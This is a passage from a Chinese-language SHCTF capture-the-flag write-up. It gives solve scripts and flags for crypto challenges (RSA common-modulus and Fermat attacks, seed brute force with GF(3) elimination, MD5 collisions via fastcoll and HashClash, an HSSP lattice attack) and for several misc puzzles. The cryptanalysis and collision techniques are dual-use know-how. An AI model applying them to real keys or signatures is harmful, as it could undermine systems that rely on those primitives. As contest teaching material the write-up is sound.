for i in range(0, len(C_flag), 8):
    curr_s = (a * curr_s + c) % m
    chunk = C_flag[i:i+8]
    keystream = long_to_bytes(curr_s, 8)
    flag_bytes += bytes([b ^ k for b, k in zip(chunk, keystream)])

print(flag_bytes.decode('utf-8', errors='ignore').strip('\x00'))
```

**得到flag：SHCTF{LLLLLLLLLLLLLLLCCCCCGGGGGGGGG_TGY%JgWOmAM6V5n55w3m*jcPJZjHO8E1VvzrGjT84tXS332D&o4GZe8%KKzEyAngmwwx9bp5dv_O4dPpOvMy1^hM}**

---



### 4.**Challenge Info** **-** **[阶段1] TE**

```
task.py:
from Crypto.Util.number import *
import random
from secret import flag



p, q = getPrime(512), getPrime(512)
n = p * q

e1 = random.getrandbits(32)
e2 = random.getrandbits(32)

print(f'{e1 = }')
print(f'{e2 = }')

m = bytes_to_long(flag)
c1 = pow(m, e1, n)
c2 = pow(m, e2, n)

print(f'{n = }')
print(f'{c1 = }')
print(f'{c2 = }')


'''
e1 = 740153575
e2 = 2865243571
n = 136622832042809215646904518487100682818433235485047740604612449039291802103378650845690420527029208661555957840623544220907967041438993189882681277161437473818861280518627112617436473837014181944318974950710633690704711613682306786783611123590732850783007770603201513394002330426718261667816328404673167404897
c1 = 56187319559060690757544481076112948328826527679002578544683022765347668056620384831778729489197135280950314627119815558644487151419126272267146826463912815062442590228193753706779325992179790583792001196548329204758137104234662611732735693150331594645734142941475121453410494160975503459516324097097434727685
c2 = 45042409947237296641429229414329516753664139389113206575966507524195434716702812078844474626406932213486611190698953613898299571473488550533642524208077653917354039305279692307471529748408234617430389423630015569730564585740596832844917494965974840512412454337766930330443409183293514761911902752336129193323
'''
```

可以很快看出来这是一个**共模攻击**的题目。

同一个明文 $m$ 使用同一个模数 $n$，但使用了两个不同的指数 $e_1, e_2$ 进行加密。

$$ae_1 + be_2 = 1$$

$$(c_1^a \cdot c_2^b) \equiv (m^{e_1})^a \cdot (m^{e_2})^b \equiv m^{ae_1 + be_2} \equiv m^1 \pmod n$$

#### EXP:

```
from Crypto.Util.number import long_to_bytes

def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    else:
        g, y, x = extended_gcd(b % a, a)
        return g, x - (b // a) * y, y

# 参数填入
e1 = 740153575
e2 = 2865243571
n = 136622832042809215646904518487100682818433235485047740604612449039291802103378650845690420527029208661555957840623544220907967041438993189882681277161437473818861280518627112617436473837014181944318974950710633690704711613682306786783611123590732850783007770603201513394002330426718261667816328404673167404897
c1 = 56187319559060690757544481076112948328826527679002578544683022765347668056620384831778729489197135280950314627119815558644487151419126272267146826463912815062442590228193753706779325992179790583792001196548329204758137104234662611732735693150331594645734142941475121453410494160975503459516324097097434727685
c2 = 45042409947237296641429229414329516753664139389113206575966507524195434716702812078844474626406932213486611190698953613898299571473488550533642524208077653917354039305279692307471529748408234617430389423630015569730564585740596832844917494965974840512412454337766930330443409183293514761911902752336129193323

gcd_val, a, b = extended_gcd(e1, e2)

if gcd_val == 1:
    m = (pow(c1, a, n) * pow(c2, b, n)) % n
    print(long_to_bytes(m).decode())
else:
    print(f"WRONG!!!!!!!")
```

**得到flag：SHCTF{lYQkkk3ud4hqV3fZtPWH077vhI2Bqcz19ZRxf1vwRU8Ej4uvrJcF02Sd4bzjxqUH5096qWDIdTyEJ$JzF}**

---



### 5.**Challenge Info** **-** **[阶段1] not_eight_length**

```
task.py:
from Crypto.Util.number import *
from sympy import *
from secret import encrypted_flag


m = bytes_to_long(encrypted_flag)
p = getPrime(512)
temp = nextprime(p)
q = nextprime(temp)
n = p * q
e = 65537
c = pow(m, e, n)

print(f'n = {n}')
print(f'e = {e}')
print(f'c = {c}')


# n = 172113078605688993167549425692325605693719693815361211139292482064751327114103720980024048929660587708361336638391782482562146750015275689746844657810313957504514376746631004470588767450715447808496931019899675426647981223953742448155335425954936981689508246039354976739386690722681509534696120714425567962527
# e = 65537
# c = 47611886444337000128826989676221463775339201602510220886566675518701473035795983698414894648685567473325732994652173596155832091773084566434572294009136327143103984205257862772844337876748271318723897875683699389776414143689503392203746843332334862282735760778003407162335426111769147991087343730761557771446
```

p与q非常相近，可以用费马分解：

$$N = p \times q = (\frac{p+q}{2})^2 - (\frac{p-q}{2})^2$$

令 $a = \frac{p+q}{2} \approx \sqrt{N}$，则 $N = a^2 - b^2$

可以从 $\sqrt{N}$ 开始向上遍历寻找 $a$，使得 $a^2 - N$ 是一个完全平方数，快速分解 $N$

题目有hint：并不是所有的题目都是8位哦。

推出是7bit的分组。

#### EXP:

```
import math
from Crypto.Util.number import long_to_bytes

# 填入参数
n = 172113078605688993167549425692325605693719693815361211139292482064751327114103720980024048929660587708361336638391782482562146750015275689746844657810313957504514376746631004470588767450715447808496931019899675426647981223953742448155335425954936981689508246039354976739386690722681509534696120714425567962527
e = 65537
c = 47611886444337000128826989676221463775339201602510220886566675518701473035795983698414894648685567473325732994652173596155832091773084566434572294009136327143103984205257862772844337876748271318723897875683699389776414143689503392203746843332334862282735760778003407162335426111769147991087343730761557771446

def fermat_factorization(n):
    # 费马分解
    a = math.isqrt(n)
    if a * a < n:
        a += 1
    
    while True:
        b2 = a * a - n
        b = math.isqrt(b2)
        if b * b == b2:
            return a - b, a + b
        a += 1

# 分解N
print("分解中...")
p, q = fermat_factorization(n)
print("found!")

phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)

print("分组...")
flag_str = ""
temp_m = m
while temp_m > 0:
    char_code = temp_m & 0x7F
    flag_str += chr(char_code)
    temp_m >>= 7

flag = flag_str[::-1]

print(f"\nFlag: {flag}")
```

**得到flag：SHCTF{99f4a238-9bd5-498a-b8ea-5cd243a36a19}**

---



### 6.**Challenge Info** **-** **[阶段1] 古典也颇有韵味啊**

```
密文：bcin!guy zeui wh! wwps ce yryz ysex:wpurt{wc@xdii_u2frmt_cwkg_ktani0}
encode_key:ABBAAABBABBAABABAABBABAAAAABBAAABAAABBAAAABAABAAAAAABAA
```

AB的结构不是莫斯就是培根，在这里是培根密码，cyberchef cook一下。

得到两个密钥NOTUIGENERE MNSTIGEMEQE。

![image-20260211133135494](/images/image-20260211133135494.png)

维吉尼亚解密一次，发现了这个oopt!you made jt! dchm yr uaum kzkp:qlhnc{sp@jkoa_o2beic_yjwn_qlujv0}。

基本是要出来了，但是应该存在位移量的偏差导致it变成了jt，直接对后面的qlhnc{sp@jkoa_o2beic_yjwn_qlujv0}的进行语义猜测。

qlhnc对应SHCTF，sp@jkoa这里应该指的是bacon即b@con，o2beic看起来像is什么什么的，联系前面的过程，应该是i2svig，yjwn应该跟的就是enere，最后是vicky0。

**得到flag：SHCTF{ba@con_i2svig_enere_vicky0}**

---



### 7.**Challenge Info** **-** **[阶段2] Titanium Lock**

```
task.py:
from secret import flag
import random
from hashlib import md5
from Crypto.Cipher import AES
from Crypto.Util.number import bytes_to_long

class Cipher:
    def __init__(self):
        self.seed = random.randint(100000, 999999)
        self.c1 = [[random.randint(1, 100) for _ in range(12)] for _ in range(16)]
        self.c2 = [random.randint(1, 1000) for _ in range(16)]
        self.key = random.getrandbits(128)

    def f1(self, msg):
        random.seed(self.seed)
        enc, last = [], 0
        for c in str(bytes_to_long(msg)):
            r = random.randint(100000, 999999)
            last = ((int(c) + r) if int(c) % 2 == 0 else (int(c) * r)) ^ last
            enc.append(last)
        return enc

    def f2(self, v):
        v += [random.randint(0, 255) for _ in range(-len(v) % 12)]
        res = []
        for i in range(0, len(v), 12):
            chunk = v[i:i+12]
            res.extend([sum(self.c1[r][c] * chunk[c] for c in range(12)) + self.c2[r] for r in range(16)])
        return res

    def f3(self, data):
        out = [[n := random.getrandbits(128), (bin(n & self.key).count('1') % 3) % 2] for _ in range(128 * 20)]
        k = md5(str(self.key).encode()).digest()
        return out, AES.new(k, AES.MODE_CTR, nonce=b"Tiffany\x00").encrypt(str(data).encode()).hex()

    def encrypt(self, data):
        o, c = self.f3(self.f2(self.f1(data)))
        return {"p1": self.c1, "p2": self.c2, "trace": o, "result": c}

if __name__ == "__main__":
    res = Cipher().encrypt(flag)
    with open("data.txt", "w") as f:
        for k, v in res.items():
            f.write(f"{k} = {v}\n")
```

3个加密，一个一个逐层逆推。

**f3 源码：**

`f3` 生成了 2560 组 trace，每组包含一个 128 位的随机数 $n$ 和一个的比特 $b$：

$$b = (\text{popcount}(n \ \& \ \text{key}) \pmod 3) \pmod 2$$

当 $b = 1$ 时，有 $\text{popcount}(n \ \& \ \text{key}) \equiv 1 \pmod 3$，可以将 $n$ 展开为 128 位的二进制向量：

$$n_0k_0 + n_1k_1 + \dots + n_{127}k_{127} \equiv 1 \pmod 3$$

最后在 $GF(3)$ 上利用**高斯消元法**，可得 `key`，之后进行AES解密。

**f2 源码：**

`f2` 将输入数据以 12 个为一组，与一个 $16 \times 12$ 的矩阵 `p1` 相乘，再加上一个 16 维的向量 `p2`，最终输出 16 个一组的数据：

$$Res_{16 \times 1} = P1_{16 \times 12} \times Chunk_{12 \times 1} + P2_{16 \times 1}$$

直接截取 $P1$ 的前 12 行，构成一个 $12 \times 12$ 的可逆方阵 $P1'$，并取 $Res$ 和 $P2$ 的前 12 个元素。

$$Chunk = (P1')^{-1} \times (Res_{12} - P2_{12})$$

**f1 源码：**

`f1` 将 Flag 转为十进制字符串后每一位进行两种操作。

如果 $c$ 是偶数，将其与随机数 $r$ 相加。如果 $c$ 是奇数，将其与随机数 $r$ 相乘。

由于 `seed` 仅有 $9 \times 10^5$，可以直接暴力枚举 。

$val = curr \oplus last$

偶数假设：若 $val - r_i \in \{0, 2, 4, 6, 8\}$，则大概率为偶数。

奇数假设：若 $val \pmod{r_i} == 0$ 且 $val / r_i \in \{1, 3, 5, 7, 9\}$，则大概率为奇数。

将收集到的十进制数字组合起来（若出现奇怪的乱码则意味01存在歧义，进行简单 DFS）。

#### EXP:

```
import random
from hashlib import md5
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes
import numpy as np
import sys
import os

def load_data():
    # 读取数据
    file_paths = [r"C:\Users\G1731\Downloads\165011_attachment\data.txt", "data.txt"]
    p1 = p2 = trace = result = None
    for path in file_paths:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                for line in f:
                    if "=" in line:
                        k, v = line.strip().split("=", 1)
                        if k.strip() == "p1": p1 = eval(v)
                        elif k.strip() == "p2": p2 = eval(v)
                        elif k.strip() == "trace": trace = eval(v)
                        elif k.strip() == "result": result = v.strip()
            break
    if not p1:
        print("找不到 data.txt"); sys.exit()
    return p1, p2, trace, result

def gaussian_elimination_gf3(matrix, vector):
    # 解方程
    rows, cols = len(matrix), len(matrix[0])
    M = [row[:] + [val] for row, val in zip(matrix, vector)]
    pivot_row = 0
    for col in range(cols):
        if pivot_row >= rows: break
        curr = pivot_row
        while curr < rows and M[curr][col] % 3 == 0: curr += 1
        if curr == rows: continue
        M[pivot_row], M[curr] = M[curr], M[pivot_row]
        if M[pivot_row][col] % 3 == 2: M[pivot_row] = [(x * 2) % 3 for x in M[pivot_row]]
        for i in range(pivot_row + 1, rows):
            factor = M[i][col]
            if factor != 0: M[i] = [(r - factor * p) % 3 for r, p in zip(M[i], M[pivot_row])]
        pivot_row += 1
    
    x = [0] * cols
    for i in range(rows - 1, -1, -1):
        pivot_col = next((j for j, v in enumerate(M[i][:-1]) if v != 0), -1)
        if pivot_col == -1: continue
        val = M[i][-1]
        for j in range(pivot_col + 1, cols): val = (val - M[i][j] * x[j]) % 3
        x[pivot_col] = val
    return x

def solve_layer_3(trace_data, result_hex):
    # 高斯消元+AES
    print("f3逆向中")
    good_traces = [t[0] for t in trace_data if t[1] == 1][:140]
    mat = [[(n >> i) & 1 for i in range(128)] for n in good_traces]
    vec = [1] * len(good_traces)
    
    bits = gaussian_elimination_gf3(mat, vec)
    key = sum((1 if b == 2 else b) << i for i, b in enumerate(bits))
    print(f"Key: {hex(key)}")
    
    k = md5(str(key).encode()).digest()
    pt = AES.new(k, AES.MODE_CTR, nonce=b"Tiffany\x00").decrypt(bytes.fromhex(result_hex))
    return eval(pt.decode())

def solve_layer_2(p1, p2, data):
    # 矩阵还原
    print("逆矩阵中")
    res = []
    for i in range(0, len(data), 16):
        x = np.linalg.lstsq(p1, np.array(data[i:i+16]) - p2, rcond=None)[0]
        res.extend([int(round(n)) for n in x])
    return res

def solve_layer_1(v):
    # 爆破与组装flag
    print("爆破中")
    for seed in range(100000, 1000000):
        random.seed(seed)
        r0 = random.randint(100000, 999999)
        val0 = v[0] ^ 0
        if not ((val0-r0) in [0,2,4,6,8] or (r0!=0 and val0%r0==0 and (val0//r0) in [1,3,5,7,9])):
            continue
            
        random.seed(seed)
        last = 0; digits = []; valid = True
        for i, curr in enumerate(v):
            val = curr ^ last; r = random.randint(100000, 999999); last = curr
            opts = [d for d in [val - r] if d in [0, 2, 4, 6, 8]]
            if r != 0 and val % r == 0 and (val // r) in [1, 3, 5, 7, 9]: opts.append(val // r)
            
            if not opts:
                if i > 50: break # 截断
                valid = False; break
            digits.append(opts[0] if len(opts) == 1 else (0, 1))
            
        if valid and len(digits) > 50:
            print(f"得到Seed: {seed}")
            return assemble_flag(digits)
    return None

def assemble_flag(digits_struct):
    # 歧义去除
    print("组装flag中")
    sys.setrecursionlimit(10000)
    found_flags = []

    def dfs(idx, curr_str):
        if found_flags: return
        
        # 补丁
        if idx > 15 and idx % 10 == 0:
            try:
                b = long_to_bytes(int(curr_str + "0" * (len(digits_struct) - idx)))
                check_len = len(curr_str) // 3
                if not all(32 <= x <= 126 for x in b[:check_len-1]): return
            except: pass

        if idx == len(digits_struct):
            try:
                flag = long_to_bytes(int(curr_str)).decode()
                if "SHCTF{" in flag: found_flags.append(flag)
            except: pass
            return

        val = digits_struct[idx]
        if isinstance(val, tuple):
            dfs(idx + 1, curr_str + "0")
            if not found_flags: dfs(idx + 1, curr_str + "1")
        else:
            dfs(idx + 1, curr_str + str(val))

    dfs(0, "")
    if found_flags:
        print(f"\n[SUCCESS] {found_flags[0]}")
    else:
        print("Flag组装失败。")

if __name__ == "__main__":
    p1, p2, trace, result = load_data()
    data = solve_layer_3(trace, result)
    v_vec = solve_layer_2(p1, p2, data)
    solve_layer_1(v_vec)
```

**`找到flag： SHCTF{HYP3rLoN_mOd3_Lpn_@ff16X1Z_bl6_kl28_@3$_ctR_7FgDzBae0A8f3$61}` **

---

### 8.**Challenge Info** **-** **[阶段2] hash1**

```
hash1.py:
import hashlib

with open("/flag.txt","r") as f:
    flag = f.read().strip()

msg = input(f"Give me both different apples (hex(apple1), hex(apple2)) : ")

try:
    apples = msg.split(",")
    apple1 = bytes.fromhex(apples[0])
    apple2 = bytes.fromhex(apples[1])
    hash_apple1 = hashlib.md5(apple1).hexdigest()
    hash_apple2 = hashlib.md5(apple2).hexdigest()

    if apple1 == apple2:
        print(f"Oh snap, both apples are exactly the same")
    elif hash_apple1 != hash_apple2:
        print(f"Oh no, they taste different")
    else:
        print(f"Yeah, both apples are delicious!!! This is your prize: {flag}")

except:
    print(f"format fault :(")
    exit()
```

要求：内容不同，但 MD5 值完全相同。

使用工具Fastcol生成两个两个文件，将二进制文件转化位16进制数上传。

![image-20260211182621937](/images/image-20260211182621937.png)

**得到flag：SHCTF{c#n6R@TUl471#n5_BOth_HAshl_APpIes_AR3_v3RY_DEIiC10U5_l0I}**

---



### 9.**Challenge Info** **-** **[阶段2] hash2**

```
hash2.py:
import hashlib
import string

with open("/flag.txt","r") as f:
    flag = f.read().strip()

msg = input(f"Give me both special apples (hex(apple1), hex(apple2)) : ")

try:
    table = (string.ascii_letters + string.digits).encode()

    apples = msg.split(",")
    apple1 = bytes.fromhex(apples[0])
    apple2 = bytes.fromhex(apples[1])
    hash_apple1 = hashlib.md5(apple1).hexdigest()
    hash_apple2 = hashlib.md5(apple2).hexdigest()

    if len(apple1) <= 16 or len(apple1) <= 16:
        print(f"Both apples are too small")
    elif not all(ch in table for ch in apple1[:16]) or not all(ch in table for ch in apple2[:16]):
        print(f"No, both apples are too ordinary")
    elif apple1 == apple2:
        print(f"Oh snap, both apples are exactly the same")
    elif hash_apple1 != hash_apple2:
        print(f"Oh no, they taste different")
    else:
        print(f"Yeah, both apples are delicious!!! This is your prize: {flag}")

except:
    print(f"format fault :(")
    exit()
```

要求：内容不能完全相同，MD5必须相同，文件的前 16 个字符必须是字母或数字。

还是用fastcoll。

![image-20260211183515637](/images/image-20260211183515637.png)

**得到flag：SHCTF{@L7h0u9h_h4sHz_@pplES_hAv3_5IGnS_th3Y_@R3_StlLI_d3LICIoUs}**

---



### 10.**Challenge Info** **-** **[阶段3] hash3**

```
hash3.py:
import hashlib
import string

with open("/flag.txt","r") as f:
    flag = f.read().strip()

msg = input(f"Give me both special apples (hex(apple1), hex(apple2)) : ")

try:
    table = (string.ascii_letters + string.digits).encode()

    apples = msg.split(",")
    apple1 = bytes.fromhex(apples[0])
    apple2 = bytes.fromhex(apples[1])
    hash_apple1 = hashlib.md5(apple1).hexdigest()
    hash_apple2 = hashlib.md5(apple2).hexdigest()

    if len(apple1) <= 16 or len(apple1) <= 16:
        print(f"Both apples are too small")
    elif not all(ch in table for ch in apple1[:16]) or not all(ch in table for ch in apple2[:16]):
        print(f"No, both apples are too ordinary")
    elif apple1[:16] == apple2[:16]:
        print(f"Oh snap, both apples are the same")
    elif hash_apple1 != hash_apple2:
        print(f"Oh no, they taste different")
    else:
        print(f"Yeah, both apples are delicious!!! This is your prize: {flag}")

except:
    print(f"format fault :(")
    exit()
```

要求：哈希值必须完全相同。前16个字节必须不同。前16个字节必须是纯字母或数字。
工具HashClash，指定前缀攻击。

```
mkdir cpc_workdir
cd cpc_workdir
echo -n "aaaaaaaaaaaaaaaa" > prefix1.txt
echo -n "bbbbbbbbbbbbbbbb" > prefix2.txt
../scripts/cpc.sh prefix1.txt prefix2.txt
```

纯爆破攻击太久了，要两个小时多，当时也没截图，只有结果。

```
[*] Time before backtrack: 2890 s
22841931 256
33554432 364
47263102 512
Block 1: workdir6/coll1_1250198965
cd d0 8d c9 5b da b5 df df 89 cc 5b ab 2c 0b 1f
19 0a f4 6c 67 f4 26 05 11 b0 14 1e 87 54 31 15
f6 04 c9 28 63 c8 d8 3c 56 fe 21 fe 49 78 98 49
28 cb 81 ef 53 c9 5a da e2 f0 a2 7f 34 c8 68 1b
Block 2: workdir6/coll2_1250198965
cd d0 8d c9 5b da b5 df df 89 cc 5b ab 2c 0b 1f
19 0a f4 6c 67 f4 26 05 11 b0 14 1e 87 54 31 15
f6 04 c9 28 63 c8 d8 3c 56 fe 21 fe 49 78 b8 49
28 cb 81 ef 53 c9 5a da e2 f0 a2 7f 34 c8 68 1b
Found collision!
[*] Step 6 completed
[*] Number of backtracks until now: 0
[*] Collision generated: prefix1.txt.coll prefix2.txt.coll
a7ad43a364344b0814f8a2c30cf6abff  prefix1.txt.coll
a7ad43a364344b0814f8a2c30cf6abff  prefix2.txt.coll
[*] Process completed in 127 minutes (0 backtracks).
yu@localhost:~/hashclash/cpc_workdir$
```

![image-20260211184709741](/images/image-20260211184709741.png)

贴个图，表示战绩可查吧。

![image-20260211184829605](/images/image-20260211184829605.png)

**得到flag：SHCTF{hMm_i_R3@l1Y_tAS7ed_tH3_M#ST_dEL1CI#U5_Hashe_AppI3s_1n_7h3_WorLd}**

---



### 11.**Challenge Info** **-** **[阶段2] 隐藏的子集和？**

```
chall.py:
#!/usr/bin/env python
# coding: utf-8

# sage

from Crypto.Util.number import *
from sage.all import *

def derive_M(n):
    iota=0.035
    Mbits=int(2 * iota * n^2 + n * log(n,2))
    M = random_prime(2^Mbits, proof = False, lbound = 2^(Mbits - 1))
    return Integer(M)

def genHssp(m, n, p, flag):
    F = GF(p)
    x = random_matrix(F, 1, n)
    A = random_matrix(ZZ, n, m, x=0, y=3)
    A[randint(0, n-1)] = vector(ZZ, list(bin(bytes_to_long(flag))[2:]))
    h = x * A
    return h

def data_write(p, h):
    with open("data.txt", "w") as file:
        file.write(str(p) + "\n")
        h_list = list(h[0])
        file.write(str(h_list) + "\n")

flag = b'SHCTF{test_test_flag_here_here_just_test_1}'

m = bytes_to_long(flag).bit_length()
n = 70
p = derive_M(n)
h = genHssp(m, n, p, flag)
data_write(p, h)

```

题目生成了一个 $1 \times n$ 的私钥矩阵 $x$，以及一个 $n \times m$ 的矩阵 $A$（元素取值为 0, 1, 2。

给出的公钥为 $h = x \cdot A \pmod p$

矩阵 $A$ 的其中一行被替换成了 Flag 的二进制流。

面对这种HSSP的题目，可以使用正交格攻击：

构造一个格来寻找与公钥向量 $h$ 正交的短向量。计算这些正交向量的右核。因为 $A$ 的行向量满足生成 $h$ 的关系，因为它们肯定存在于这个正交补空间中。通过对核的基向量进行格规约，就可以恢复A。因为 Flag 所在的行只包含 `0` 和 `1`，它的欧几里得范数一定会比 $A$ 中其他包含 2的行更小。只要找到这个最短向量，就可以拿到 Flag。

#### **EXP:**

```
import ast
from sage.all import *
from Crypto.Util.number import long_to_bytes
import sys

def solve():
    # 读取数据
    file_path = "data.txt"
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
            p = int(lines[0].strip())
            h = ast.literal_eval(lines[1].strip())
    except Exception as e:
        print(f"[-] Error reading file: {e}")
        return

    m = len(h)
    n = 70
    target_ortho_count = m - n
    print(f"[*] Parameters: m={m}, n={n}, expected orthogonal vectors={target_ortho_count}")

    # 构建格寻找正交向量
    M_lat = Matrix(ZZ, m + 1, m + 1)
    for i in range(m):
        M_lat[i, i] = 1
        M_lat[i, m] = h[i]
    M_lat[m, m] = p

    print("Running...")
    L_red = M_lat.LLL()

    ortho_vecs = []
    for row in L_red:
        if row[m] == 0:
            ortho_vecs.append(row[:m])
    
    found_count = len(ortho_vecs)
    # 保留前 m-n 个
    if found_count > target_ortho_count:
        ortho_vecs = ortho_vecs[:target_ortho_count]

    # 计算核并使用 BKZ 规约
    V = Matrix(ZZ, ortho_vecs)
    print("[*] Computing right kernel...")
    K = V.right_kernel()
    B_A = K.basis_matrix()
    
    print("Running")
    B_A_red = B_A.BKZ(block_size=20)

    # 扫描 Flag
    print("[*] Scanning basis vectors for Flag...")
    for row in B_A_red:
        for r in [row, -row]: 
            vals = list(r)
            # Flag只包含 0 和 1
            if all(v in [0, 1] for v in vals):
                try:
                    bits_str = "".join(str(x) for x in vals)
                    flag_int = int(bits_str, 2)
                    flag_bytes = long_to_bytes(flag_int)
                    if b"SHCTF" in flag_bytes:
                        print(f"\nFlag: {flag_bytes.decode(errors='ignore')}")
                        return
                except:
                    pass

if __name__ == "__main__":
    solve()
```

**得到flag：SHCTF{2c128cca-9600-4c9a-aeec-bd69e6e27de6}**

---

### 12.**Challenge Info** **-** **[阶段3] 椭圆曲线？？？！！！**

```
task.py:
import hashlib
import ecdsa
from Crypto.Util.number import *
import random
import json


def ver_length(secret_data):
    
    p = getPrime(256)
    secret = bytes_to_long(secret_data)
    start = secret - 19 * p
    end = secret + 21 * p

    return start, end

def init(secret_data, msg1, msg2):

    secret = bytes_to_long(secret_data)
    
    gen = ecdsa.NIST256p.generator
    order = gen.order()
    
    pub_key = ecdsa.ecdsa.Public_key(gen, gen * secret)
    priv_key = ecdsa.ecdsa.Private_key(pub_key, secret)
    
    k = random.getrandbits(order.bit_length())
    
    hash1 = int(hashlib.sha256(msg1).hexdigest(), 16)
    signature1 = priv_key.sign(hash1, k)
    
    hash2 = int(hashlib.sha256(msg2).hexdigest(), 16)
    signature2 = priv_key.sign(hash2, k)
    
    return signature1, signature2, k, secret

def main():
    
    flag = b'SHCTF{test_flag_here}'
    msg1 = b"Welcome_to_SHCTF"
    msg2 = b"It's_a_easy_problem_you_can_solve"

    start, end = ver_length(flag)
    sig1, sig2, k, secret_value = init(flag, msg1, msg2)

    output_data = {
        'msg1': msg1.decode(),
        'msg2': msg2.decode(),
        'sig1_r': hex(sig1.r)[2:],
        'sig1_s': hex(sig1.s)[2:],
        'sig2_r': hex(sig2.r)[2:],
        'sig2_s': hex(sig2.s)[2:],
        'start': hex(start),
        'end': hex(end)
    }
    
    with open('data.json', 'w') as f:
        json.dump(output_data, f, indent=2)


if __name__ == "__main__":
    main()


```

代码中包含 flag 的 `secret` 只进行了极其简单的线性运算：

$start = secret - 19 \cdot p$

$end = secret + 21 \cdot p$

二元一次方程组，两式相减可直接消去 `secret` 并得到 $p$ 的值：$end - start = 40 \cdot p$

因此 $p = (end - start) / 40$，求出 $p$ 后，带回原式即可直接得到 flag：

因此可得 $secret = start + 19 \cdot p$

感觉是非预期解，因为太简单了。

#### EXP:

```
import json
from Crypto.Util.number import long_to_bytes

def solve():
    # 读取数据
    with open('data.json', 'r') as f:
        data = json.load(f)

    print("解方程")
    start = int(data['start'], 16)
    end = int(data['end'], 16)
    
    # 求解 p
    # end - start = 40 * p
    p = (end - start) // 40
    
    # 得flag
    # secret = start + 19 * p
    secret = start + 19 * p
    
    print(f"Flag: {long_to_bytes(secret).decode()}")

if __name__ == "__main__":
    solve()
```

**得到flag：SHCTF{205436e5-d598-4859-a237-d3f40e7ed45b}**

---

---

---

## #MISC:

### 1.**Challenge Info** **-** **[阶段1] Evan**

![image-20260211193234115](/images/image-20260211193234115.png)

![image-20260211193247547](/images/image-20260211193247547.png)

简述思路：

binwalk提取，压缩包解一下伪加密。

**得到flag：SHCTF{Evan_1s_s0_h4nds0me!}**

---



### 2.**Challenge Info** **-** **[阶段1] Office**

office隐写，我打不开，直接改后缀zip，压缩。

![image-20260211194141747](/images/image-20260211194141747.png)

随便翻翻，发现一个与base有关的字符串，**lRy1m2qYkmewkTqDrneCoTCQoUiFqm7zqoeRoT7DqDCAqm7QsTqRuT3PqjWUt5e7**。

![image-20260211194313979](/images/image-20260211194313979.png)

发现一个自定义base64表。

#### EXP：

```
import base64

ciphertext = "lRy1m2qYkmewkTqDrneCoTCQoUiFqm7zqoeRoT7DqDCAqm7QsTqRuT3PqjWUt5e7"

custom_table = "+/0123456abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ789"
standard_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

trans = str.maketrans(custom_table, standard_table)
standard_ciphertext = ciphertext.translate(trans)

# 自定义解码
try:
    flag = base64.b64decode(standard_ciphertext).decode('utf-8')
    print(f"{flag}")
except Exception as e:
    print(f"错误: {e}")
```

**得到flag：SHCTF{MS_Office_is_the_best_office_software.wps}**

---



### 3.**Challenge Info** **-** **[阶段1] 不止二维码**

对附件的二维码进行StegSolve查看，会发现二维码会发生一点改变。

qr扫一扫：

```
FLAG_PART_2: ABBB/AABBB/AAAAA/BBBBB/ABBBBA/BBBBA/B/AABBB/ABBB
FLAG_PART_3: MkZkbDg3ZlY3ZEQxalNGenQyZUFYT3E0NmRrTXFV
FLAG_PART_1: SHCTF{55a23d24-
```

ABBB/AABBB/AAAAA/BBBBB/ABBBBA/BBBBA/B/AABBB/ABBB用莫斯密码解码，得到b705-4e7b。

MkZkbDg3ZlY3ZEQxalNGenQyZUFYT3E0NmRrTXFV	 Base64 -> Base62 -> Base58 -> Base32解码得到-942e-bdd}。

**得到flag：SHCTF{55a23d24-b705-4e7b-942e-bdd}**

---



### 4.**Challenge Info** **-** **[阶段1] 提问前请先搜索**

![image-20260212104151948](/images/image-20260212104151948.png)

文字题很喜欢f12看看，这里存在空白处，预计flag点。

![image-20260212104228271](/images/image-20260212104228271.png)

控制台回显和network存在一个字体，但没有加载出来。

写一个JavaScript抓取一下数据。

```
(function() {
    console.log("%c抓取中", "color: cyan; font-weight: bold;");
    const allElements = document.querySelectorAll('*');
    allElements.forEach(el => {
        const style = window.getComputedStyle(el);
        if (style.fontFamily.includes("SH2Sans")) {
            const text = el.innerText || el.textContent;
            if (text.trim().length > 0) {
                console.log("%c[发现目标]:", "color: orange;", el);
                console.log("%c[原始文本]:", "color: white;", text);
                console.log("%c[unicode编码]:", "color: yellow;", 
                    Array.from(text).map(c => "0x" + c.charCodeAt(0).toString(16)).join(', ')
                );
            }
        }
    });
})();
```

```
抓取中
VM228:9 [发现目标]: <strong class="find">  </strong>
VM228:10 [原始文本]:   
VM228:11 [unicode编码]: 0x20, 0xe130, 0xec35, 0xed5d, 0xf777, 0xf348, 0xefab, 0xf5be, 0xe250, 0xe0f0, 0xf531, 0xeddc, 0xece1, 0xe0f0, 0xe08b, 0xf0e3, 0xe4fb, 0xed4d, 0xe0f0, 0xeddc, 0xf531, 0xe0f0, 0xe082, 0xe5af, 0xf32c, 0x20
```

拿下unicode编码，去看字体对应unicode编码。

**得到flag：SHCTF{Do_nOt_r3Iy_On_Al}**

备注：由于相当于是再做一次，交不了，不确定这个flag是不是正确的，但存疑点也就O,0,I,1之中，几种组合肯定有一个是对的。

---



### 5.**Challenge Info** **-** **[阶段1] 签到**

![0EA47A9944A60E273DB830118139C59F](/images/0EA47A9944A60E273DB830118139C59F.jpg)

---



### 6.**Challenge Info** **-** **[阶段1] 薇薇安的美照**

010editor打开图片发现尾部存在SHCTF{MV84Xzc0XzIwXzdfOTJfMTZfNV8xOF84Xzc=}。

base解码后得到1_8_74_20_7_92_16_5_18_8_7。

联系题目背景化学元素。

**得到flag：SHCTF{H_O_W_CA_N_U_S_B_AR_O_N}**

备注：两个字符的忘记是都大写，还是保持了，反正flag就这个。

---



### 7.**Challenge Info** **-** **[阶段2] 奇怪的数据**

![image-20260212105530862](/images/image-20260212105530862.png)

一眼像素点的考点，写个脚本恢复一下。

#### EXP：

```
import re
import math
from PIL import Image

def solve_pixel_challenge(file_path, output_name='recovered_flag.png'):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            data = f.read()

        print("正在提取数据...")
        pixels = re.findall(r'\((\d+),\s*(\d+),\s*(\d+)\)', data)
